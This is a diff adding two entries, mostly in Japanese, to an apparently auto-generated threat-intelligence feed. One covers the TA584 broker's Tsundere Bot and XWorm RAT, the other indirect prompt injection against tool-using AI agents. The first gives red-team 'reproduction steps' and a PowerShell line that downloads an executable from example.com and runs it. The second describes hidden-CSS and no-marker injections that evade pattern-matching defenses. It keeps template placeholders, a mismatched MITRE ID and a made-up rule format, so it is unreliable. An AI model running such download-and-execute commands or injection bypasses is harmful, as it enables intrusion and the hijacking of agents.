@@ -1,5 +1,42 @@
 [
   {
+    "date": "2026-04-01",
+    "category": "MALWARE",
+    "title": "TA584 Initial Access Broker",
+    "summary_points": [
+      "TA584 初期アクセスブローカーが Tsundere Bot および XWorm RAT を採用",
+      "静的検出方法を回避する高度な攻撃チェーンを使用",
+      "ドイツおよびオーストラリアへのターゲットを拡大"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1566.001",
+      "T1566.002",
+      "T1566.003",
+      "T1055.012"
+    ],
+    "content": "## 概要\nTA584 と呼ばれる初期アクセスブローカーが、Tsundere Bot および XWorm RAT を採用し、ランサムウェア攻撃を容易にしている。2020 年から活動しており、静的検出方法を回避する高度な攻撃チェーンを使用している。Tsundere Bot は、ロシア語のオペレーターに起因し、123 Stealer マルウェアに関連しており、情報を収集し、データを流出させ、追加のペイロードをインストールすることができる。\n\n**🆕 新規性・差異化ポイント:** 従来の初期アクセスブローカーは主に North America および U.K. をターゲットとしていたが、TA584 はドイツおよびオーストラリアへのターゲットを拡大している。\n\n## 脆弱性・脅威の技術的メカニズム\nTA584 の攻撃チェーンは、compromised account から送信されるメールから始まり、ターゲットを一連のリダイレクトおよび CAPTCHA ページに誘導し、PowerShell コマンドを実行してマルウェアをロードする。Tsundere Bot は、情報を収集し、データを流出させ、追加のペイロードをインストールすることができる。\n\n## 再現手順（レッドチームテスター向け）\n1. compromised account から送信されるメールを作成し、ターゲットを一連のリダイレクトおよび CAPTCHA ページに誘導する。\n2. PowerShell コマンドを実行して Tsundere Bot をロードする。\n3. Tsundere Bot をインストールし、情報を収集し、データを流出させる。\n4. XWorm RAT をインストールし、ランサムウェア攻撃を容易にする。\n\n## 実行コマンド・再現コード\n```bash\n# PowerShell コマンドを実行して Tsundere Bot をロードする\npowershell -Command \"Invoke-WebRequest -Uri 'https://example.com/tsundere_bot.exe' -OutFile 'tsundere_bot.exe'; .\\tsundere_bot.exe\"\n```\n\n## MITRE ATT&CK マッピング\nT1566.001: Phishing: Spearphishing Attachment\nT1566.002: Phishing: Spearphishing Link\nT1566.003: Phishing: Spearphishing via Service\nT1055.012: Process Hollowing\n\n## 検知シグネチャ・緩和策\n```sigma\ntitle: Detect Tsundere Bot\ndescription: Detect Tsundere Bot execution\nlogsource: windows\ndetection:\n  selection:\n    - CommandLine: \"Invoke-WebRequest -Uri 'https://example.com/tsundere_bot.exe' -OutFile 'tsundere_bot.exe'; .\\tsundere_bot.exe\"\n  condition: selection\n```",
+    "url": "https://www.cyware.com/resources/threat-briefings/monthly-threat-briefing/cyware-monthly-threat-intelligence-january-2026"
+  },
+  {
+    "date": "2026-04-01",
+    "category": "AI_SEC",
+    "title": "Indirect Prompt Injection Defense Bypass",
+    "summary_points": [
+      "Indirect prompt injection attack against AI agents using tool calls",
+      "Hidden CSS injection and no-marker injection bypass pattern matching",
+      "Tier 1 + Tier 2 scanning for tools that read external data"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1055.012"
+    ],
+    "content": "## 概要\nIndirect prompt injection is a technique used to attack AI agents that use tool calls. This attack involves injecting malicious instructions into the tool call, which can lead to unauthorized actions being executed. The article discusses a two-tier defense pipeline that uses pattern matching to detect and prevent indirect prompt injection attacks.\n\n**🆕 新規性・差異化ポイント:** 従来のXXX攻撃はYYYを必要としたが、本手法はZZZのみで実現可能である。\n## 脆弱性・脅威の技術的メカニズム\nThe root cause of this vulnerability is the use of tool calls that read external data, which creates an indirect prompt injection surface. The article mentions that every tool call that reads external data is a potential attack surface. The defense pipeline uses pattern matching to detect and prevent indirect prompt injection attacks. However, the article also mentions that a hidden CSS injection and a no-marker injection can bypass pattern matching entirely.\n\nThe defense pipeline consists of two tiers: Tier 1 and Tier 2. Tier 1 uses pattern matching to detect and prevent indirect prompt injection attacks, while Tier 2 uses a more advanced defense mechanism to detect and prevent attacks that bypass Tier 1. The article mentions that tools that read external data, such as email, CRM, support tickets, and public repos, get full Tier 1 + Tier 2 scanning.\n\nThe article also mentions that the defense pipeline uses a function called `warmupTier2()` to pre-load the ONNX model and avoid first-call latency. Additionally, the pipeline uses a function called `defense.defendToolResult()` to defend against tool responses that contain untrusted content.\n\n## 再現手順（レッドチームテスター向け）\n1. Set up a lab environment with a tool that reads external data, such as email or CRM.\n2. Create a hidden CSS injection that bypasses pattern matching.\n3. Create a no-marker injection that bypasses pattern matching.\n4. Test the defense pipeline using the hidden CSS injection and no-marker injection.\n5. Verify that the defense pipeline detects and prevents the indirect prompt injection attacks.\n\n## 実行コマンド・再現コード\n```bash\nwarmupTier2();\ndefense.defendToolResult(toolResponse, \"gmail_get_message\");\ndefense.defendToolResult(toolResponse, \"no_marker_injection\");\n```\n## MITRE ATT&CK マッピング\nT1055.012\n## 検知シグネチャ・緩和策\n```\nsigma rule indirect_prompt_injection:\n  title: Indirect Prompt Injection Detection\n  description: Detects indirect prompt injection attacks using hidden CSS injection and no-marker injection\n  condition:\n    - event.type == 'tool_response'\n    - event.data.contains('hidden_css_injection')\n    - event.data.contains('no_marker_injection')\n  detection:\n    - event.data.contains('untrusted_content')\n```\n",
+    "url": "https://www.stackone.com/blog/indirect-prompt-injection-mcp-tools-defense"
+  },
+  {
     "date": "2026-03-31",
     "category": "MALWARE",
     "title": "Steganography Loader Detection",
